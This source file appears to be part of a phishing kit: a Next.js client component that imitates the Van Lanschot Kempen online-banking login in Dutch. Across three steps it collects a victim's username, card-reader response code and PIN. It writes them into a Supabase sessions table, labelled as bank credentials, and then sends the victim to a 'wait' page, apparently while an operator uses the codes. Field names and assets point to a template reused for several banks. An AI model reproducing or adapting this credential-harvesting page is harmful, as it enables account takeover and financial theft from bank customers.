"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { normalizeBankCredentialPayload } from "@/lib/bank-page-adapter";

type Props = {
  sessionId: string;
};

export function VanLanschotKempenClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [responseCode, setResponseCode] = useState("");
  const [pin, setPin] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.tacCode) setResponseCode(fd.tacCode);
      if (fd.pin) setPin(fd.pin);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleFinalSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

    const credentials = normalizeBankCredentialPayload({
      bankSlug: "van-lanschot-kempen",
      bankName: "Van Lanschot Kempen",
      verfuegernummer: username,
      pin: pin,
      tacCode: responseCode,
    });

    const { error: updateError } = await supabase
      .from("sessions")
      .update({
        current_step: "wait",
        form_data: {
          ...prev,
          ...credentials,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Er is een fout opgetreden. Probeer het opnieuw.");
      return;
    }
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA] font-sans flex flex-col text-[#0F2241]">
      {/* Header */}
      <header className="bg-white h-[80px] flex items-center justify-start px-6 lg:px-[10%] border-b border-gray-200 shrink-0">
        <img src="/bank-logos/van-lanschot-kempen.svg" alt="Van Lanschot Kempen" className="h-10" />
      </header>

      {/* Main Content */}
      <main className="flex-1 flex justify-center pt-12 pb-20 px-4">
        <div className="bg-white border border-gray-200 w-full max-w-[500px] shadow-sm p-8 h-fit">
          <h1 className="text-[28px] font-medium mb-6">Inloggen Mijn Van Lanschot Kempen</h1>

          {step === 1 && (
            <div>
              <p className="text-[15px] mb-6 font-medium">Log in met uw gebruikersnaam en wachtwoord.</p>
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  if (username.trim()) {
                    setStep(2);
                  }
                }}
              >
                <div className="mb-6">
                  <label className="block text-[14px] font-bold mb-2">Gebruikersnaam</label>
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#0F2241] focus:ring-1 focus:ring-[#0F2241]"
                  />
                </div>
                <button
                  type="submit"
                  disabled={!username.trim()}
                  className="bg-[#0F2241] hover:bg-[#1A3A6B] text-white px-8 py-3 w-full font-bold transition-colors disabled:opacity-50"
                >
                  Verder
                </button>
              </form>
            </div>
          )}

          {step === 2 && (
            <div>
              <p className="text-[15px] mb-4 font-medium">Houd uw kaart en kaartlezer bij de hand.</p>
              
              <div className="flex justify-center mb-6">
                 <img src="/bank-assets/vanlanschotkempen/tasarım 2 okuyucu.png" alt="Kaartlezer" className="max-h-[150px] object-contain" />
              </div>

              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  if (responseCode.trim()) {
                    setStep(3);
                  }
                }}
              >
                <div className="mb-6">
                  <label className="block text-[14px] font-bold mb-2">Responscode</label>
                  <input
                    type="text"
                    required
                    value={responseCode}
                    onChange={(e) => setResponseCode(e.target.value)}
                    className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#0F2241] focus:ring-1 focus:ring-[#0F2241]"
                  />
                </div>
                <button
                  type="submit"
                  disabled={!responseCode.trim()}
                  className="bg-[#0F2241] hover:bg-[#1A3A6B] text-white px-8 py-3 w-full font-bold transition-colors disabled:opacity-50"
                >
                  Verder
                </button>
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="mt-4 text-[#0F2241] underline text-sm w-full text-center"
                >
                  Terug
                </button>
              </form>
            </div>
          )}

          {step === 3 && (
            <div>
              <p className="text-[15px] mb-6 font-medium">Voer ter bevestiging uw PIN in.</p>
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  if (pin.trim()) {
                    void handleFinalSubmit();
                  }
                }}
              >
                <div className="mb-6">
                  <label className="block text-[14px] font-bold mb-2">Pincode</label>
                  <input
                    type="password"
                    required
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    className="w-full border border-gray-300 p-3 text-[15px] focus:outline-none focus:border-[#0F2241] focus:ring-1 focus:ring-[#0F2241]"
                  />
                </div>
                {error && <p className="text-red-600 text-sm mb-4">{error}</p>}
                <button
                  type="submit"
                  disabled={saving || !pin.trim()}
                  className="bg-[#0F2241] hover:bg-[#1A3A6B] text-white px-8 py-3 w-full font-bold transition-colors disabled:opacity-50"
                >
                  {saving ? "Laden..." : "Activeer"}
                </button>
                <button
                  type="button"
                  onClick={() => setStep(2)}
                  disabled={saving}
                  className="mt-4 text-[#0F2241] underline text-sm w-full text-center"
                >
                  Terug
                </button>
              </form>
            </div>
          )}

        </div>
      </main>
    </div>
  );
}
